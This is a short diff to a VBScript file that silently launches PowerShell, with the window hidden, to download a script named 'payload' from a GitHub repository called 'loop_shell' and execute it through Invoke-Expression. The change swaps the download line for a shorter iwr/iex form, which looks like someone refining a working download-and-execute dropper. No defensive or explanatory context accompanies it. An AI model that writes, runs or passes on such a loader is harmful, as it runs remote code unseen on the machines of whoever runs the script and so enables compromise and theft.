@@ -1,7 +1,8 @@
 Set objShell = CreateObject("WScript.Shell")
 
 ' Define the PowerShell command
-powershellCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri https://raw.githubusercontent.com/anaprivate/loop_shell/refs/heads/main/payload | Invoke-Expression | Invoke-Expression"""
+powershellCommand = "powershell.exe -Command ""iwr https://raw.githubusercontent.com/anaprivate/loop_shell/refs/heads/main/payload -UseBasicParsing | iex
+"""
 
 ' Run the PowerShell command
 objShell.Run powershellCommand, 0, True
